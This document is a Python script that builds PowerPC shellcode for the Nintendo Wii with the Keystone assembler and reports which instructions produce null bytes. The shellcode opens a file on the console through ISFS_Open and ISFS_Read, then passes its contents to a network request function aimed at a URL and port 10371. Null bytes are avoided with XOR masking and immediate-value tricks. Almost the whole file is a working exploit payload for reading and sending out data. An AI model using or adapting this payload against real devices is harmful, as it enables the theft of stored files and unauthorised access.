#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Generate Wii-compatible PowerPC shellcode, highlight bad bytes,
and list the instructions that introduce them.
"""

from keystone import Ks, KS_ARCH_PPC, KS_MODE_PPC32, KS_MODE_BIG_ENDIAN
from colorama import Fore, Style, init as colorama_init

# ---------- Wii IOS symbols ----------
ISFS_Open     = 0x80107DE4
ISFS_Read     = 0x80107ED4
make_request  = 0x8000C974

# ---------- Data locations ------------
PATH_LOCATION   = 0x90799718
URL_LOCATION    = 0x90799722
READ_BUFFER     = 0x90799760

PORT = 10371

# ---------- Helpers -------------------
h16 = lambda v: (v >> 16) & 0xFFFF
l16 = lambda v:  v        & 0xFFFF

def build_asm() -> str:
    """Return the fully-formatted assembly template."""
    return f"""
        addis 3, 0, 0x{h16(PATH_LOCATION):04x}
        ori   3, 3, 0x{l16(PATH_LOCATION):04x}
        xor   4, 4, 4        # clear r4
        # We just need 1 in r4, but we can't use null bytes
        addi  4, 4, 0x101
        andi.   4, 4, 0xf0ff

        addis 12, 0, 0x{h16(ISFS_Open):04x}
        ori   12,12, 0x{l16(ISFS_Open):04x}
        mtctr 12
        bctrl

        or    31,3,3

        or    3,31,31
        addis 4, 0, 0x{h16(READ_BUFFER):04x}
        ori   4, 4, 0x{l16(READ_BUFFER):04x}
        xor   5, 5, 5        # clear r5
        addi  5, 5, 0x101
        andi.   5, 5, 0xfff0

        addis 12,0, 0x{h16(ISFS_Read):04x}
        ori   12,12,0x{l16(ISFS_Read):04x}
        mtctr 12
        bctrl

        addis 3, 0, 0x{h16(URL_LOCATION):04x}
        ori   3, 3, 0x{l16(URL_LOCATION):04x}
        xor  4, 4, 4        # clear r4
        xor 4, 4, 4        # clear r4
        addi  4, 4, 0x{PORT:04x}
        addis 5, 0, 0x{h16(READ_BUFFER):04x}
        ori   5, 5, 0x{l16(READ_BUFFER):04x}
        xor   6, 6, 6        # clear r6
        addi  6, 6, 0x101
        andi.   6, 6, 0xfff0 # Avoid null bytes in

        xor   12, 12, 12        # clear r12
        addis 12,12, 0x{h16(make_request)^0x0110:04x} # We need is to not have null bytes
        ori   12,12, 0x{l16(make_request):04x}
        xor   11, 11, 11        # clear r11
        addis 11,11, 0x0110
        xor   12, 11, 12  # r12 = make_request ^ 0x00100000
        mtctr 12
        bctrl
    """

def assemble(asm_source: str) -> bytes:
    """Assemble the given PPC32 Big-Endian source to raw shellcode."""
    ks = Ks(KS_ARCH_PPC, KS_MODE_PPC32 | KS_MODE_BIG_ENDIAN)
    encoding, _ = ks.asm(asm_source)
    return bytes(encoding)

def highlight_shellcode(data: bytes) -> str:
    """Return a printable string with \x00 bytes rendered in red."""
    out = []
    for b in data:
        byte = f"\\x{b:02x}"
        if b == 0:
            out.append(f"{Fore.RED}{byte}{Style.RESET_ALL}")
        else:
            out.append(byte)
    return ''.join(out)

def instructions_causing_nulls(asm_source: str) -> list[tuple[str, bytes]]:
    """
    Re-assemble each individual instruction so we can tell
    which of them produces a 0x00 byte.
    """
    ks = Ks(KS_ARCH_PPC, KS_MODE_PPC32 | KS_MODE_BIG_ENDIAN)
    offenders = []
    for raw in asm_source.splitlines():
        # strip comments and blank lines
        instr = raw.split('#', 1)[0].strip()
        if not instr:
            continue
        enc, _ = ks.asm(instr)
        encoded = bytes(enc)
        if 0 in encoded:
            offenders.append((instr, encoded))
    return offenders

# ---------- Main entry point ----------
if __name__ == "__main__":
    colorama_init(autoreset=True)

    asm_source = build_asm()
    shellcode  = assemble(asm_source)

    # 1) Pretty print the final shellcode
    print(f"shellcode length: {len(shellcode)} bytes\n")
    print(highlight_shellcode(shellcode), "\n")

    # 2) Show which instructions contain nul bytes
    bad_instrs = instructions_causing_nulls(asm_source)
    if bad_instrs:
        print("Instructions containing \\x00 bytes:\n")
        for instr, enc in bad_instrs:
            hex_bytes = ' '.join(f"{b:02x}" for b in enc)
            print(f"  {instr:<24} â†’  {hex_bytes}")
    else:
        print("Great news: no instruction introduced a null byte!")
